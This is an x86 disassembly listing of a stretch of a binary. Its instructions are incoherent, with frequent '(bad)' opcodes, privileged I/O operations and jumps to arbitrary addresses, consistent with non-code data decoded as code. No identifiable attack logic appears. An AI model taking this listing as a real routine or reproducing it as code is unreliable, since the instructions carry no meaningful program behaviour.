  41c739:	in     eax,dx
  41c73a:	nop
  41c73b:	xor    al,0xbd
  41c73d:	or     DWORD PTR [ecx+0xc1ac],ecx
	...
  41c7b3:	add    BYTE PTR [edx-0x8b13804],cl
  41c7b9:	jg     0x41c746
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0x352a7954
  41c7c3:	add    edx,DWORD PTR [ecx]
  41c7c5:	xor    eax,DWORD PTR [ecx]
  41c7c7:	add    ch,dh
  41c7c9:	add    BYTE PTR [eax],al
  41c7cb:	add    BYTE PTR [ecx+ebp*1-0x24],cl
  41c7cf:	xor    ebp,ebx
  41c7d1:	inc    ecx
  41c7d2:	pop    eax
  41c7d3:	icebp  
  41c7d4:	jbe    0x41c77c
  41c7d6:	jl     0x41c780
  41c7d8:	stos   BYTE PTR es:[edi],al
  41c7d9:	retf   0xfad6
  41c7dc:	add    al,0xb7
  41c7de:	mov    BYTE PTR [esi],dh
  41c7e0:	repnz ins BYTE PTR es:[edi],dx
  41c7e2:	xor    al,0x31
  41c7e4:	dec    ebx
  41c7e5:	pop    edx
  41c7e6:	popa   
  41c7e7:	ret    
  41c7e8:	add    al,BYTE PTR [eax+0x32]
  41c7eb:	cmp    ecx,esp
  41c7ed:	iret   
  41c7ee:	pusha  
  41c7ef:	jl     0x41c846
  41c7f1:	loopne 0x41c825
  41c7f3:	mov    ecx,0x5a95d773
  41c7f8:	pop    es
  41c7f9:	loope  0x41c7ee
  41c7fb:	repnz ss ss imul esp,ebx,0x7c
  41c801:	or     eax,0x5fddf937
  41c806:	mov    ah,0xb6
  41c808:	mov    esp,0x5395a749
  41c80d:	sbb    eax,0x28053586
  41c812:	(bad)  
  41c813:	pop    edx
  41c814:	adc    ah,BYTE PTR fs:[edx]
  41c817:	clc    
  41c818:	add    ebp,eax
  41c81a:	and    esi,DWORD PTR [ecx]
  41c81c:	dec    eax
  41c81d:	xor    al,0x8c
  41c81f:	jns    0x41c87b
  41c821:	dec    edi
  41c822:	aaa    
  41c823:	out    dx,al
  41c824:	xchg   ebp,eax
  41c825:	or     edx,eax
  41c827:	jmp    0xb4cc0acf
  41c82c:	or     al,0xc7
  41c82e:	into   
  41c82f:	stc    
  41c830:	leave  
  41c831:	xor    DWORD PTR [eax+0x37],esi
  41c834:	gs enter 0x7812,0x42
  41c839:	adc    DWORD PTR [ecx],0x38
  41c83c:	out    dx,eax
  41c83d:	sbb    al,0x98
  41c83f:	iret   
  41c840:	cmp    ebp,edx
  41c842:	add    al,0xb9
  41c844:	inc    edi
  41c845:	cli    
  41c846:	ja     0x41c892
  41c848:	rcr    BYTE PTR [edx],0xdd
  41c84b:	jae    0x41c899
  41c84d:	xor    BYTE PTR [eax-0xdc64917],0x77
  41c854:	stos   BYTE PTR es:[edi],al
  41c855:	xor    al,0x66
  41c857:	jge    0x41c895
  41c859:	dec    eax
  41c85a:	or     DWORD PTR [eax-0x35],ecx
  41c85d:	pop    ss
  41c85e:	sub    DWORD PTR [edx],esi
  41c860:	int    0x87
  41c862:	fld    QWORD PTR [ebx+0x65]
  41c865:	std    
  41c866:	lods   eax,DWORD PTR ds:[esi]
  41c867:	pushf  
  41c868:	adc    DWORD PTR [edx+0x64],edx
  41c86b:	std    
  41c86c:	test   esp,ecx
  41c86e:	xchg   edi,eax
  41c86f:	retf   0x6cc5
  41c872:	stc    
  41c873:	aas    
  41c874:	mov    edx,0x71d515f5
  41c879:	xor    BYTE PTR [eax],al
  41c87b:	add    edx,0xd98ac584
  41c881:	push   ecx
  41c882:	xor    DWORD PTR [ebx-0x78b7b46c],esp
  41c888:	jne    0x41c905
  41c88a:	mov    DWORD PTR [ecx-0x5e3644f7],edx
  41c890:	into   
  41c891:	add    al,BYTE PTR [ecx+esi*4]
  41c894:	mov    dh,BYTE PTR [ecx+eiz*4-0x56b8f1f1]
  41c89b:	call   0xcfb199f0
  41c8a0:	cld    
  41c8a1:	addr16 popf 
  41c8a3:	dec    ecx
  41c8a4:	cmp    bl,BYTE PTR [ecx+0x47afefb6]
  41c8aa:	shl    BYTE PTR [esi-0x6e45be41],cl
  41c8b0:	push   ebx
  41c8b1:	(bad)  
  41c8b2:	jnp    0x41c88f
  41c8b4:	retf   0x74cc
  41c8b7:	push   0xb
  41c8b9:	add    DWORD PTR [esp+esi*4-0x79],0xffffff99
  41c8be:	fist   WORD PTR es:[eax+eax*1+0x0]
	...
  41c932:	add    BYTE PTR [eax],al
  41c934:	ret    
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	std    
  41c941:	xor    BYTE PTR [ebp-0x50],ah
  41c944:	push   es
  41c945:	xor    al,0x1
  41c947:	add    ch,dh
  41c949:	add    BYTE PTR [eax],al
  41c94b:	add    dh,dl
  41c94d:	jge    0x41c95b
  41c94f:	fisubr DWORD PTR [ecx-0x5879b2dd]
  41c955:	adc    esi,DWORD PTR [esi]
  41c957:	mov    cl,0x38
  41c959:	iret   
  41c95a:	sub    eax,0xaaeafade
  41c95f:	in     al,0xd7
  41c961:	icebp  
  41c962:	shl    BYTE PTR [esi+0x51bb82ec],0x83
  41c969:	fist   WORD PTR [edx+0x4e]
  41c96c:	fld    QWORD PTR [edx-0x15]
  41c96f:	inc    esi
  41c970:	push   cs
  41c971:	xor    edx,DWORD PTR [eax+0xd716204]
  41c977:	sbb    al,0xb3
  41c979:	push   esi
  41c97a:	adc    eax,esi
  41c97c:	cmp    al,0xd7
  41c97e:	dec    esp
  41c97f:	add    edi,DWORD PTR [edi-0x5d3752f8]
  41c985:	jecxz  0x41c9ea
  41c987:	xor    esi,DWORD PTR [ecx+ebx*4]
  41c98a:	mov    ch,0xa5
  41c98c:	cld    
  41c98d:	sbb    al,0xe2
  41c98f:	lea    edx,[esi+ebx*1+0x28]
  41c993:	inc    eax
  41c994:	push   0xffffffe2
  41c996:	or     DWORD PTR [eax],ecx
  41c998:	xchg   esi,eax
  41c999:	popa   
  41c99a:	dec    ecx
  41c99b:	or     bl,BYTE PTR [esp+eax*2-0x158c307b]
  41c9a2:	js     0x41c9c4
  41c9a4:	sbb    eax,0x6737b357
  41c9a9:	nop
  41c9aa:	das    
  41c9ab:	jmp    0x41c9ba
  41c9ad:	adc    BYTE PTR [ecx-0x78],dl
  41c9b0:	(bad)  
  41c9b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9b2:	pop    edi
  41c9b3:	sbb    ebx,ebx
  41c9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9b6:	aas    
  41c9b7:	ss push ebx
  41c9b9:	in     eax,dx
  41c9ba:	adc    dh,BYTE PTR [ecx-0x3ad7a9a5]
  41c9c0:	aad    0x4a
  41c9c2:	ss push 0x65dc012d
  41c9c8:	jo     0x41c9d2
  41c9ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9cb:	into   
  41c9cc:	pop    edi
  41c9cd:	cmp    al,0xfa
  41c9cf:	call   0x68f2d9db
  41c9d4:	outs   dx,DWORD PTR ds:[esi]
  41c9d5:	and    BYTE PTR [edi],dl
  41c9d7:	ret    
  41c9d8:	les    esi,FWORD PTR [edx+edx*8-0x11de5b09]
  41c9df:	clc    
  41c9e0:	xchg   DWORD PTR [eax],eax
  41c9e2:	adc    eax,0x93911a1c
  41c9e7:	aad    0x5a
  41c9e9:	cld    
  41c9ea:	adc    dh,dh
  41c9ec:	lds    edi,FWORD PTR [edx-0x7d]
  41c9ef:	gs add ch,ch
  41c9f2:	pop    ebx
  41c9f3:	aas    
  41c9f4:	pop    es
  41c9f5:	subps  xmm0,XMMWORD PTR [edi-0x5b]
  41c9f9:	fs jns 0x41c97d
  41c9fc:	add    al,BYTE PTR [eax+0x7e85ebb0]
  41ca02:	in     al,0x89
  41ca04:	ss sub DWORD PTR ss:[ebp+0x58],ecx
  41ca09:	mov    ds:0x34d8cd5a,eax
  41ca0e:	fwait
  41ca0f:	mov    al,ds:0xc8b51edd
  41ca14:	xor    al,0xa
  41ca16:	(bad)  
  41ca17:	idiv   BYTE PTR [esi+0x7f46fe79]
  41ca1d:	or     BYTE PTR [esi],dl
  41ca1f:	xor    edi,DWORD PTR [esi-0x47df90a6]
  41ca25:	rol    BYTE PTR [ebp+0x3c73cb67],cl
  41ca2b:	fs xor eax,0xee6cb439
  41ca31:	dec    eax
  41ca32:	mov    ch,0x31
  41ca34:	repz xchg ebx,eax
  41ca36:	mov    ebp,0xcdaf16b0
  41ca3b:	shr    BYTE PTR [ebp+0x2cc0faa7],1
	...
  41cab1:	add    BYTE PTR [eax],al
  41cab3:	add    BYTE PTR [edx],cl
  41cab5:	mov    eax,0xbfb7aaa5
  41caba:	(bad)  
  41cabc:	sbb    eax,0xc2e2887e
  41cac1:	add    BYTE PTR [edx+0x134fb2f],0x0
  41cac8:	cmc    
  41cac9:	add    BYTE PTR [eax],al
  41cacb:	add    BYTE PTR [edi+0x417a3df6],al
  41cad1:	inc    edx
  41cad2:	stos   DWORD PTR es:[edi],eax
  41cad3:	add    DWORD PTR [ecx],0xffffffa3
  41cad6:	cmc    
  41cad7:	mov    dh,0x48
  41cad9:	nop
  41cada:	in     al,dx
  41cadb:	push   0xba18d468
  41cae0:	lock aad 0x5f
  41cae3:	not    BYTE PTR [edx]
  41cae5:	pop    edi
  41cae6:	bound  ebx,QWORD PTR [edi]
  41cae8:	repz aas 
  41caea:	inc    ecx
  41caeb:	xchg   ecx,eax
  41caec:	loopne 0x41cb5d
  41caee:	(bad)  
  41caef:	add    dl,ah
  41caf1:	xchg   ebp,eax
  41caf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caf3:	inc    ebp
  41caf4:	cmp    BYTE PTR [ebp+0x42],bh
  41caf7:	in     eax,dx
  41caf8:	xor    ch,BYTE PTR [edi+0x18746892]
  41cafe:	mov    ebx,0x48226d0
  41cb03:	fdiv   QWORD PTR cs:[esi+0xc]
  41cb07:	lahf   
  41cb08:	sar    BYTE PTR [esi],1
  41cb0a:	xor    ecx,eax
  41cb0c:	or     BYTE PTR [ebp+edx*2+0x73126eec],0x57
  41cb14:	shr    BYTE PTR [ecx],1
  41cb16:	jle    0x41cb36
  41cb18:	nop
  41cb19:	mul    BYTE PTR [eax]
  41cb1b:	or     BYTE PTR [ebp+0x4fc08bfd],cl
  41cb21:	cs call 0xb00c:0xfdfd7a94
  41cb29:	jmp    0x41caec
  41cb2b:	pop    ss
  41cb2c:	push   cs
  41cb2d:	in     al,dx
  41cb2e:	out    0xd9,al
  41cb30:	adc    BYTE PTR [ebx+0x68],0xa5
  41cb34:	movntq (bad),mm6
  41cb35:	out    0xf5,eax
  41cb37:	mov    eax,ds:0xd8fcdebb
  41cb3c:	inc    ecx
  41cb3d:	mov    ds:0x96b077dc,al
  41cb42:	call   0xf9fe:0xebcf8255
  41cb49:	jle    0x41cb37
  41cb4b:	mov    BYTE PTR [edx+0x50],bl
  41cb4e:	adc    BYTE PTR [esi],0x6f
  41cb51:	xchg   dh,ch
  41cb53:	addr16 rcr dh,0x9b
  41cb57:	fiadd  DWORD PTR [ebp+0x58c65594]
  41cb5d:	loop   0x41caea
  41cb5f:	cdq    
  41cb60:	int3   
  41cb61:	sbb    eax,0x1df73338
  41cb66:	mov    ds:0x376d8402,al
  41cb6b:	push   esp
  41cb6c:	loopne 0x41cbed
  41cb6e:	inc    BYTE PTR [eax+0x4d]
  41cb71:	js     0x41cb01
  41cb73:	cmc    
  41cb74:	jmp    0x41cbc6
  41cb76:	out    0x75,al
  41cb78:	xor    edi,DWORD PTR [eax]
  41cb7a:	mov    ds:0x745114f8,al
  41cb7f:	arpl   WORD PTR [edi+0x5bb68ab1],si
  41cb85:	js     0x41cb6b
  41cb87:	lea    ebx,[edx-0x3e63bcae]
  41cb8d:	cwde   
  41cb8e:	in     al,0xec
  41cb90:	imul   ebp,DWORD PTR [ebp+0x54],0xffffffca
  41cb94:	test   eax,0xb187713e
  41cb99:	test   al,0xa8
  41cb9b:	pusha  
  41cb9c:	(bad)  
  41cb9d:	lods   al,BYTE PTR ds:[esi]
  41cb9e:	test   eax,0x14afc717
  41cba3:	fmul   DWORD PTR [edi]
  41cba5:	push   cs
  41cba6:	or     dl,bh
  41cba8:	(bad)  
  41cbaa:	or     cl,0x9a
  41cbad:	in     eax,dx
  41cbae:	cmp    eax,ebx
  41cbb0:	inc    eax
  41cbb1:	sti    
  41cbb2:	ret    0x3b78
  41cbb5:	out    0x93,al
  41cbb7:	xor    BYTE PTR [ebx],bl
  41cbb9:	mov    esp,0x28fc19ae
  41cbbe:	bound  esi,QWORD PTR es:[edi]
	...
  41cc31:	add    BYTE PTR [eax],al
  41cc33:	add    dl,dl
  41cc35:	xor    bh,dl
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0xc2
  41cc41:	sti    
  41cc42:	in     al,0xef
  41cc44:	lock xor eax,0xf50001
  41cc4a:	add    BYTE PTR [eax],al
  41cc4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc4d:	push   ebp
  41cc4e:	sbb    eax,0x2ebf3f53
  41cc53:	or     BYTE PTR [ecx+0x73],bh
  41cc56:	sbb    BYTE PTR [esi],bh
  41cc58:	es aad 0x4
  41cc5b:	je     0x41cc2b
  41cc5d:	pop    es
  41cc5e:	push   ebx
  41cc5f:	mov    eax,ds:0x9ecbc9ab
  41cc64:	lahf   
  41cc65:	pusha  
  41cc66:	mov    bh,0x55
  41cc68:	sub    BYTE PTR [ebp-0x5dc8654],bl
  41cc6e:	cld    
  41cc6f:	rol    BYTE PTR [esp+edx*2],1
  41cc72:	jle    0x41cc94
  41cc74:	xlat   BYTE PTR ds:[ebx]
  41cc75:	pop    edi
  41cc76:	test   al,0x54
  41cc78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc79:	aam    0xa5
  41cc7b:	in     eax,dx
  41cc7c:	test   ecx,0x9f330bb5
  41cc82:	scas   eax,DWORD PTR es:[edi]
  41cc83:	out    0xe8,eax
  41cc85:	pop    ss
  41cc86:	xor    al,0x31
  41cc88:	jnp    0x41cc97
  41cc8a:	or     cl,ch
  41cc8c:	xchg   ebp,eax
  41cc8d:	xchg   ebp,eax
  41cc8e:	mov    ch,0x17
  41cc90:	or     dl,BYTE PTR [esi+0x9bc279a]
  41cc96:	xchg   edx,eax
  41cc97:	imul   ecx,DWORD PTR [eax],0xf00c28b1
  41cc9d:	sub    eax,0x62161aa9
  41cca2:	lea    ebp,[ebp+0x7597e87]
  41cca8:	aaa    
  41cca9:	sub    bh,BYTE PTR [edi-0x3c]
  41ccac:	js     0x41cc87
  41ccae:	jne    0x41cca8
  41ccb0:	push   ebp
  41ccb1:	push   0x1db1d74b
  41ccb6:	push   ecx
  41ccb7:	add    eax,0x2cd66b04
  41ccbc:	ret    0xcaba
  41ccbf:	ss ret 
  41ccc1:	xor    eax,0x55a56c2
  41ccc6:	mov    ch,0xbd
  41ccc8:	mov    ds:0x3ee4f08a,al
  41cccd:	inc    ebp
  41ccce:	scas   eax,DWORD PTR es:[edi]
  41cccf:	mov    ds:0x78c6722f,al
  41ccd4:	dec    eax
  41ccd5:	pop    ds
  41ccd6:	xlat   BYTE PTR ds:[ebx]
  41ccd7:	push   esp
  41ccd8:	loop   0x41cd33
  41ccda:	lds    edi,FWORD PTR [ecx-0x36]
  41ccdd:	pop    edx
  41ccde:	sbb    al,0x5c
  41cce0:	dec    edx
  41cce1:	mov    ah,dh
  41cce3:	push   eax
  41cce4:	jbe    0x41ccdb
  41cce6:	or     dl,BYTE PTR [ebx]
  41cce8:	xchg   BYTE PTR [edi+0x7ff25d5a],al
  41ccee:	dec    eax
  41ccef:	pushf  
  41ccf0:	les    ebp,FWORD PTR [ebx+0x69]
  41ccf3:	push   edx
  41ccf4:	or     DWORD PTR [edx+0x9],ebx
  41ccf7:	cdq    
  41ccf8:	xor    DWORD PTR [edx-0x6c],edx
  41ccfb:	cmp    eax,0x517e4862
  41cd00:	out    0x3a,al
  41cd02:	mov    ch,dh
  41cd04:	push   ebx
  41cd05:	add    ch,bh
  41cd07:	lock shl BYTE PTR [eax+0x2a49f84f],0xbe
  41cd0f:	dec    esi
  41cd10:	mov    ebx,DWORD PTR ds:0xa5789650
  41cd16:	or     dh,BYTE PTR [ebx+0x6e04136e]
  41cd1c:	imul   edi,DWORD PTR [edx],0xfffffff9
  41cd1f:	mov    ds:0xb06a9e67,eax
  41cd24:	lock xor al,BYTE PTR [esi+ebx*4]
  41cd28:	mov    esi,0x7d9946fd
  41cd2e:	rcr    DWORD PTR ds:0xea398383,cl
  41cd34:	jmp    0x41ccfa
  41cd36:	nop
  41cd37:	pop    esp
  41cd38:	clc    
  41cd39:	scas   eax,DWORD PTR es:[edi]
  41cd3a:	fild   QWORD PTR ds:0x67b4be16
  41cd40:	add    BYTE PTR fs:[eax],al
	...
  41cdb3:	add    BYTE PTR [ebp-0x63956373],al
  41cdb9:	jnp    0x41cdb2
  41cdbb:	out    dx,eax
  41cdbc:	push   ebp
  41cdbd:	call   0xcdf0:0xb767b1bb
  41cdc4:	in     eax,0x36
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	cmc    
  41cdc9:	add    BYTE PTR [eax],al
  41cdcb:	add    BYTE PTR [eax+0x18],al
  41cdce:	xchg   esi,eax
  41cdcf:	dec    edi
  41cdd0:	xchg   esp,eax
  41cdd1:	mov    dh,BYTE PTR ds:0x5aeaf1e2
  41cdd7:	xchg   esp,ebx
  41cdd9:	cs xchg edx,ecx
  41cddc:	and    ebp,DWORD PTR [ebx+0x20]
  41cddf:	or     al,0xe2
  41cde1:	arpl   WORD PTR [eax+0x37],si
  41cde4:	push   edx
  41cde5:	sbb    eax,0x68d19916
  41cdea:	fcmovnu st,st(0)
  41cdec:	nop
  41cded:	mov    edi,DWORD PTR [edi+0x2d]
  41cdf0:	push   edi
  41cdf1:	push   edi
  41cdf2:	xchg   ebp,eax
  41cdf3:	jmp    0x41ce06
  41cdf5:	call   0xe40900e3
  41cdfa:	adc    al,0xd7
  41cdfc:	dec    esi
  41cdfd:	xchg   BYTE PTR [eax],ch
  41cdff:	dec    ebp
  41ce00:	sar    BYTE PTR [ebx],0x3b
  41ce03:	push   edi
  41ce04:	mov    eax,0x712b001a
  41ce09:	out    0xde,eax
  41ce0b:	call   0x7e6:0x5639133e
  41ce12:	out    dx,eax
  41ce13:	out    dx,al
  41ce14:	mov    ebx,0x4f231573
  41ce19:	push   eax
  41ce1a:	aas    
  41ce1b:	mov    dh,BYTE PTR [si+0x453c]
  41ce20:	or     al,0x3d
  41ce22:	mov    ecx,0x2738e2c7
  41ce27:	(bad)  
  41ce28:	pop    edi
  41ce29:	sub    al,0xf5
  41ce2b:	call   0x6764451c
  41ce30:	in     eax,dx
  41ce31:	and    al,0x8f
  41ce33:	or     edi,esi
  41ce35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce36:	xchg   ebx,eax
  41ce37:	sub    ah,bl
  41ce39:	call   0xc35407b7
  41ce3e:	sub    DWORD PTR [edx+0xf9023ec],edi
  41ce44:	or     ah,cl
  41ce46:	sbb    ah,al
  41ce48:	sub    eax,eax
  41ce4a:	cs mov dh,0x52
  41ce4d:	(bad)  
  41ce4e:	lahf   
  41ce4f:	pushf  
  41ce50:	xchg   ebp,eax
  41ce51:	mov    gs,WORD PTR [ecx-0x62]
  41ce54:	pop    esi
  41ce55:	pop    es
  41ce56:	push   ecx
  41ce57:	hlt    
  41ce58:	mov    al,ds:0xd3fbefb0
  41ce5d:	nop
  41ce5e:	mov    bl,0xbd
  41ce60:	hlt    
  41ce61:	add    al,0x21
  41ce63:	adc    eax,0xff227385
  41ce68:	repz rol DWORD PTR [eax+0x53],cl
  41ce6c:	mov    dh,0xc9
  41ce6e:	jns    0x41ce86
  41ce70:	std    
  41ce71:	sub    bh,dl
  41ce73:	xchg   ecx,eax
  41ce74:	fadd   st(6),st
  41ce76:	lods   eax,DWORD PTR ds:[esi]
  41ce77:	xor    edi,DWORD PTR [eax-0x3afe38fe]
  41ce7d:	pop    esi
  41ce7e:	dec    edx
  41ce7f:	add    bl,BYTE PTR [eax+edx*4+0x54576883]
  41ce86:	cmp    eax,0x11faf019
  41ce8b:	push   cs
  41ce8c:	(bad)  
  41ce8d:	loopne 0x41cecb
  41ce8f:	inc    ebp
  41ce90:	(bad)  
  41ce91:	sub    ah,BYTE PTR [edi]
  41ce93:	aaa    
  41ce94:	repnz push 0x64
  41ce97:	add    bl,BYTE PTR [ecx]
  41ce99:	jmp    0xec00:0x5e2b0d2f
  41cea0:	in     eax,dx
  41cea1:	push   edx
  41cea2:	mov    ds:0xd402f688,al
  41cea7:	test   DWORD PTR ds:0x9d4aa4d8,ebp
  41cead:	nop
  41ceae:	xor    ebx,0x76cb615d
  41ceb4:	iret   
  41ceb5:	push   0xffffff8f
  41ceb7:	xor    esp,edi
  41ceb9:	jg     0x41ceac
  41cebb:	imul   esp,ebx,0x1a
  41cebe:	js     0x41cf10
  41cec0:	out    0x0,eax
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	(bad)  
  41cf41:	in     eax,0x49
  41cf43:	hlt    
  41cf44:	fidiv  DWORD PTR [edi]
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	cmc    
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [edi-0x77],ch
  41cf4e:	dec    esi
  41cf4f:	push   es
  41cf50:	pop    ds
  41cf51:	sub    edx,DWORD PTR [esi+ecx*4+0x32]
  41cf55:	pop    edi
  41cf56:	imul   ebx,DWORD PTR [eax+0x28],0x4f
  41cf5a:	push   edx
  41cf5b:	ret    
  41cf5c:	iret   
  41cf5d:	xor    bh,BYTE PTR [edi-0x26b61b9d]
  41cf63:	cdq    
  41cf64:	fs sbb eax,0x2c36a0de
  41cf6a:	mov    ch,0x54
  41cf6c:	cmp    esp,esp
  41cf6e:	lock loopne 0x41cef9
  41cf71:	jne    0x41cf26
  41cf73:	mov    al,ds:0x344f6e9e
  41cf78:	inc    esi
  41cf79:	jecxz  0x41cf4f
  41cf7b:	dec    eax
  41cf7c:	adc    al,0x3d
  41cf7e:	not    al
  41cf80:	jno    0x41cf37
  41cf82:	popa   
  41cf83:	add    DWORD PTR [edx],esi
  41cf85:	or     ch,BYTE PTR [ebp+0xe7478db]
  41cf8b:	lock imul ecx,DWORD PTR [ebp+0x6e143550],0xa8845a
  41cf96:	add    eax,0x270a5df3
  41cf9b:	fimul  WORD PTR [esp+ebx*2]
  41cf9e:	dec    ebx
  41cf9f:	add    ebp,DWORD PTR [ebx+0x46]
  41cfa2:	and    DWORD PTR ds:[ebp+ebx*4-0x78],edi
  41cfa7:	xchg   edi,eax
  41cfa8:	cld    
  41cfa9:	pop    ebx
  41cfaa:	add    eax,0xc57ffe55
  41cfaf:	scas   al,BYTE PTR es:[edi]
  41cfb0:	lods   eax,DWORD PTR ds:[esi]
  41cfb1:	pusha  
  41cfb2:	fdivr  QWORD PTR [esi+eax*8+0x60dce57e]
  41cfb9:	inc    edx
  41cfba:	lea    esi,[ebp+0x51835232]
  41cfc0:	dec    esp
  41cfc1:	adc    bl,BYTE PTR [ebx+0x1a]
  41cfc4:	and    edx,DWORD PTR [esp+edx*1]
  41cfc7:	push   es
  41cfc8:	pop    edi
  41cfc9:	(bad)  
  41cfca:	and    bl,dl
  41cfcc:	(bad)  
  41cfcd:	dec    edx
  41cfce:	pushf  
  41cfcf:	fcmovnb st,st(6)
  41cfd1:	das    
  41cfd2:	rcr    BYTE PTR [eax+0x57adf7a1],cl
  41cfd8:	test   DWORD PTR ds:0x60576983,0x60422e04
  41cfe2:	sbb    eax,0xdcd38cea
  41cfe7:	mov    DWORD PTR [ecx],ebp
  41cfe9:	rcr    dh,cl
  41cfeb:	aam    0x35
  41cfed:	clc    
  41cfee:	ret    
  41cfef:	or     BYTE PTR [edx+0x5a567a80],bh
  41cff5:	jmp    0x41cff4
  41cff7:	or     ah,dh
  41cff9:	or     eax,0xda34dfcc
  41cffe:	xor    al,0x3a
  41d000:	jg     0x41d013
  41d002:	push   edi
  41d003:	(bad)  
  41d004:	push   ecx
  41d005:	test   al,0x3a
  41d007:	fwait
  41d008:	popf   
  41d009:	popf   
  41d00a:	int3   
  41d00b:	cmp    bl,BYTE PTR ds:0x80dfa0f
  41d011:	neg    BYTE PTR [eax-0x38aa217]
  41d017:	stos   DWORD PTR es:[edi],eax
  41d018:	mov    ebx,esi
  41d01a:	mov    al,0xda
  41d01c:	repnz lods al,BYTE PTR ds:[esi]
  41d01e:	or     esi,DWORD PTR [eax+0x352995bc]
  41d024:	outs   dx,DWORD PTR ds:[esi]
  41d025:	shl    BYTE PTR [edi-0x69],0xc5
  41d029:	push   edx
  41d02a:	sub    DWORD PTR [edi+0x8b6a975],edx
  41d030:	cmp    ecx,DWORD PTR [ecx]
  41d032:	inc    ebx
  41d033:	repz sub eax,0x79f6edef
  41d039:	pushf  
  41d03a:	lahf   
  41d03b:	daa    
  41d03c:	mov    esi,0x3f08bd83
	...
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    cl,bl
  41d0b5:	dec    edx
  41d0b6:	mov    eax,ds:0xd9fbb3f8
  41d0bb:	imul   ebp,DWORD PTR [edx+0x6b80a798],0xffffffe6
  41d0c2:	push   eax
  41d0c3:	nop
  41d0c4:	iret   
  41d0c5:	cmp    BYTE PTR [ecx],al
  41d0c7:	add    ch,dh
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [ebx-0x733b2dd4],bl
  41d0d1:	add    ah,BYTE PTR [ebx-0x1c]
  41d0d4:	(bad)  
  41d0d5:	mov    ds:0xaab733f2,eax
  41d0da:	mov    esi,gs
  41d0dc:	in     eax,0x24
  41d0de:	out    0xf7,eax
  41d0e0:	mov    ch,0x29
  41d0e2:	pushf  
  41d0e3:	dec    BYTE PTR [edx+ecx*1+0x71]
  41d0e7:	(bad)  
  41d0e8:	pop    ecx
  41d0e9:	pop    cx
  41d0eb:	outs   dx,BYTE PTR ds:[esi]
  41d0ec:	xor    al,0x2f
  41d0ee:	out    dx,eax
  41d0ef:	jge    0x41d08e
  41d0f1:	pop    eax
  41d0f2:	or     eax,0xe39632dd
  41d0f7:	in     al,dx
  41d0f8:	pop    edx
  41d0f9:	int    0x30
  41d0fb:	inc    esi
  41d0fc:	aas    
  41d0fd:	xchg   dl,cl
  41d0ff:	mov    ds:0x97d7fe0,eax
  41d104:	(bad)  
  41d105:	mov    ah,0xe1
  41d107:	hlt    
  41d108:	xchg   edi,eax
  41d10a:	les    ebp,FWORD PTR [edi]
  41d10c:	sbb    BYTE PTR [ecx+0x19446d71],0x4e
  41d113:	xor    eax,0xa0b42e4e
  41d118:	hlt    
  41d119:	pop    edi
  41d11a:	or     dl,BYTE PTR es:[ebp-0x2c7f196a]
  41d121:	stos   BYTE PTR es:[edi],al
  41d122:	hlt    
  41d123:	push   0x7
  41d125:	jg     0x41d14e
  41d127:	repnz adc bl,BYTE PTR [ebx-0x513282bb]
  41d12e:	xor    DWORD PTR [ecx],esp
  41d130:	fmul   QWORD PTR [ecx]
  41d132:	pop    ecx
  41d133:	inc    esi
  41d134:	xchg   edx,eax
  41d135:	cmp    al,0x42
  41d137:	xor    BYTE PTR [eax+0x58],dl
  41d13a:	cwde   
  41d13b:	inc    esi
  41d13c:	jno    0x41d160
  41d13e:	jg     0x41d176
  41d140:	pop    ds
  41d141:	test   eax,0xfc004b29
  41d146:	and    ecx,edx
  41d148:	pop    esp
  41d149:	xor    dl,BYTE PTR [eax-0x2043b3cf]
  41d14f:	jne    0x41d155
  41d151:	mov    cl,cl
  41d153:	add    al,0x86
  41d155:	push   edi
  41d156:	icebp  
  41d157:	call   0x1b6ffe1b
  41d15c:	clc    
  41d15d:	cmp    DWORD PTR [ebx-0x6e],edx
  41d160:	inc    ebx
  41d161:	mov    cl,0xb1
  41d163:	xlat   BYTE PTR ds:[ebx]
  41d164:	push   ecx
  41d165:	out    0x6c,al
  41d167:	es inc esi
  41d169:	sahf   
  41d16a:	lods   eax,DWORD PTR ds:[esi]
  41d16b:	dec    edi
  41d16c:	or     esi,edi
  41d16e:	aaa    
  41d16f:	cmc    
  41d170:	shl    BYTE PTR [esi],0x76
  41d173:	and    edx,ebx
  41d175:	cdq    
  41d176:	enter  0x821b,0xb7
  41d17a:	lahf   
  41d17b:	inc    ecx
  41d17c:	add    esp,ecx
  41d17e:	dec    ecx
  41d17f:	push   edx
  41d180:	push   0x59
  41d182:	jb     0x41d10a
  41d184:	or     edi,ebx
  41d186:	jnp    0x41d1b1
  41d188:	pop    ecx
  41d189:	out    dx,al
  41d18a:	mov    tr3,esi
  41d18d:	dec    esp
  41d18e:	inc    esi
  41d18f:	dec    edx
  41d190:	xor    eax,0x41149e6c
  41d195:	mov    ch,BYTE PTR [edx]
  41d197:	xchg   edx,eax
  41d198:	pop    ebp
  41d199:	mov    dh,0x9c
  41d19b:	jg     0x41d149
  41d19d:	ins    BYTE PTR es:[edi],dx
  41d19e:	cmp    bh,BYTE PTR [esi+ebp*8-0x960c7d6]
  41d1a5:	jae    0x41d16c
  41d1a7:	pop    ds
  41d1a8:	xchg   ecx,eax
  41d1a9:	sbb    esp,0xffffffd1
